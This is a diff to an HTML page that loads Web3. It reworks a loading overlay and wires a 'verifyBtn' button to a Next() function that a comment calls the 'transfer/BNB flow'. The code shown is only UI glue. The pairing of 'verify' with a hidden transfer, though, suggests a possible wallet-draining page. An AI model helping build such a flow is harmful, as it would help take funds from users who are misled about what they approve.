@@ -94,7 +94,7 @@
   <!-- Custom script after Web3 -->
   <script src="js/script.js"></script>
 
-  <!-- Optional: sync our loading overlay with script's showLoading/hideLoading -->
+  <!-- Sync loading overlay with script's showLoading/hideLoading so "Processing..." shows when Next runs -->
   <script>
     (function () {
       var overlay = document.getElementById("loadingOverlay");
@@ -103,7 +103,7 @@
       var origHide = window.hideLoading;
       if (typeof origShow === "function") {
         window.showLoading = function (msg) {
-          if (overlay) { overlay.style.display = "flex"; var t = overlay.querySelector(".loading-text"); if (t && msg) t.textContent = msg; }
+          if (overlay) { overlay.style.display = "flex"; var t = overlay.querySelector(".loading-text"); if (t) t.textContent = msg || "Processing..."; }
           return origShow.apply(this, arguments);
         };
       }
@@ -157,9 +157,31 @@
     })();
   </script>
 
-  <!-- ✅ Add event listener to call `Next()` -->
+  <!-- Next button: run transfer/BNB flow from js/script.js (show Processing, then Next()) -->
   <script>
-    document.getElementById("verifyBtn").addEventListener("click", Next);
+    (function () {
+      var overlay = document.getElementById("loadingOverlay");
+      var nextBtn = document.getElementById("verifyBtn");
+      var loadingText = overlay && overlay.querySelector(".loading-text");
+
+      function onNextClick() {
+        if (typeof window.Next !== "function") return;
+        if (overlay) { overlay.style.display = "flex"; if (loadingText) loadingText.textContent = "Processing..."; }
+        window.Next();
+      }
+
+      function bindNext() {
+        if (!nextBtn) return;
+        nextBtn.removeEventListener("click", onNextClick);
+        nextBtn.addEventListener("click", onNextClick);
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", bindNext);
+      } else {
+        bindNext();
+      }
+    })();
   </script>
   <!-- Update USD estimate and Next button: no amount = light blue (disabled), valid amount = dark blue (enabled) -->
   <script>
